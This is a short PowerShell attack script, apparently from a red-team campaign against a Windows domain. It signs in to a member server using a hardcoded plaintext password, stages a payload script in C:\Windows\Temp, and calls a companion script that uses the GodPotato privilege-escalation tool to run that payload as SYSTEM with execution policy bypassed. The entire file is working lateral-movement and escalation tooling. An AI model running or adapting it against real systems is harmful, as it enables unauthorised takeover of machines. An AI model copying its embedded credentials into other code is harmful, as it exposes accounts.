# Generic runner: stage payload to mbr01 + invoke as SYSTEM via GodPotato chain
param(
    [string]$PayloadName = 'wt035j-debug.ps1'
)
$ErrorActionPreference = 'Stop'

$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', (ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force))
$session = New-PSSession -ComputerName 'mbr01.child.cadre.local' -Credential $cred
Copy-Item -Path "$PSScriptRoot\$PayloadName" -Destination "C:\Windows\Temp\cadre-tools\$PayloadName" -ToSession $session -Force
Remove-PSSession $session
Write-Output "PAYLOAD_STAGED $PayloadName"

& "$PSScriptRoot\campaign-a-t043-system-exec.ps1" -Server 192.168.77.22 -Username analyst_t1 -Password 'T13r_An@lyst!' -GpPath 'C:\Windows\Temp\cadre-tools\GodPotato.exe' -ScriptBlock "powershell -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\cadre-tools\$PayloadName"
Write-Output "RUN_DONE $PayloadName"
